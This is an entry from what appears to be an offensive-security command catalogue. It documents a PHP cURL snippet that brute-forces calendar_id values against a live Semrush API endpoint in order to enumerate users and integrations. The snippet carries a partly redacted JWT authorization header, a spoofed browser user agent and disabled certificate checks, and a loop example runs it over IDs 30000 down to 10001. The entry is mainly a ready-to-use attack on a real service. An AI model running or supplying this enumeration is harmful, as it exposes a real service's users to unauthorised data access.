---
data: >-
  $curl = curl_init(); $opts = [ CURLOPT_URL =>
  'https://ec.semrush.com/api/v1/ga/user_status/?calendar_id='.$I,
  CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0)
  Gecko/20100101 Firefox/71.0', CURLOPT_HTTPHEADER => ['Authorization: JWT
  eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.████████.dRNCN9jt0gTvnhYMAzQFGb1HJXVV3Rr72rk_P485THY'],
  CURLOPT_RETURNTRANSFER => true, CURLOPT_SSL_VERIFYHOST => false,
  CURLOPT_SSL_VERIFYPEER => false ]; curl_setopt_array($curl, $opts); $response
  = json_decode(curl_exec($curl), true);
tags:
  - bruteforce
  - curl
  - api
type: command
output: |-
  Parsed JSON response, e.g., array(2) { ["id"]=>
    int(67890)
    ["status"]=>
    string(11) "AUTHORISED"
  }
executor: php
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:34.332Z'
id: 6bf7f846-5684-4391-bcdf-281cc4d38b7c
verified: false
validated: true
submitted: true
---
# php-curl-bruteforce-semrush

## Command

```php
$curl = curl_init(); $opts = [ CURLOPT_URL => 'https://ec.semrush.com/api/v1/ga/user_status/?calendar_id='.$I, CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0', CURLOPT_HTTPHEADER => ['Authorization: JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.████████.dRNCN9jt0gTvnhYMAzQFGb1HJXVV3Rr72rk_P485THY'], CURLOPT_RETURNTRANSFER => true, CURLOPT_SSL_VERIFYHOST => false, CURLOPT_SSL_VERIFYPEER => false ]; curl_setopt_array($curl, $opts); $response = json_decode(curl_exec($curl), true);
```

## Description

This PHP code snippet, used within a loop where $I is the current calendar_id, sets up and executes a cURL request to the Semrush API to fetch user status, parsing the JSON response for further processing in bruteforcing operations.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $I | Loop variable for calendar_id | Yes |
| CURLOPT_URL | Dynamic URL with appended calendar_id | Yes |
| CURLOPT_USERAGENT | Browser spoofing string | Yes |
| CURLOPT_HTTPHEADER | JWT auth header | Yes |
| CURLOPT_RETURNTRANSFER | Capture response | Yes |
| CURLOPT_SSL_VERIFYHOST | Disabled for testing (false) | No |
| CURLOPT_SSL_VERIFYPEER | Disabled for testing (false) | No |

## Examples

### Basic Usage

```php
$I = 12345; // Set in loop
// Execute the cURL code
```

### Advanced Usage

Integrate in for loop:

```php
for($I=30000; $I>=10001; $I--) { // cURL code here; if(isset($response['id'])) { /* store */ } }
```

## Expected Output

$responses variable holds parsed JSON, such as array with 'id' and 'status' keys, used to build enumeration results.

## Related

- [[Related Procedure: Bruteforce-Calendar-IDs-to-Enumerate-Users-and-Integrations]]
